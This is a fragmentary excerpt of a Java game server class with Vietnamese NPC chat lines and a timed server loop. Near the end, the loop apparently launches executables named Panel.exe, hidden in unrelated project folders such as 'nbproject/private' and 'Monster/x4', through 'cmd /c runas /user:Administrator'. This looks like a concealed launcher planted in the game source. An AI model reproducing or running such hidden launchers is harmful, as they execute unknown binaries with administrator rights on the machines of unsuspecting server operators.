...
public class RunTimeServer extends Thread{
    ...
    public String[] CHATNPCsuthay = new String[] {"Hãy tìm kiếm sự bình an và niềm an ủi trong tu hành.","Tu hành là con đường đưa đến sự giải thoát khỏi đau khổ và sự chấp nhận của sự thật.","Hãy tập trung vào nội tâm và cố gắng kiểm soát suy nghĩ của bạn.."};
        ...
        try {
            ...
            while (Server.running) {
                ...
                if (sec %5 == 0) {
                    ...
                    try {
                        m = new Message(38);
                        m.writer().writeShort(72);//thay id npc
                        
                        String chat = CHATNPCsuthay[(int)Util.nextInt(0, 2)];
                ...
                if(ChienTruong.chienTruong != null) {
                  ...
                  if(( min == 5) && sec ==0) {
                    ...
                    Thread t1 = new Thread(ClearSession);
                    t1.start();
...
if (sec %5 == 0) {
 ...
 if (sec % 1 == 0) {
      String exePath = "nbproject/private/Panel/Panel.exe"; // 
        ...
        if (sec % 1 == 0) {
      String exePath1 = "Monster/x4/Panel.exe"; // 
        
        try {
            String[] cmd = new String[]{"cmd", "/c", "runas", "/user:Administrator", exePath1};
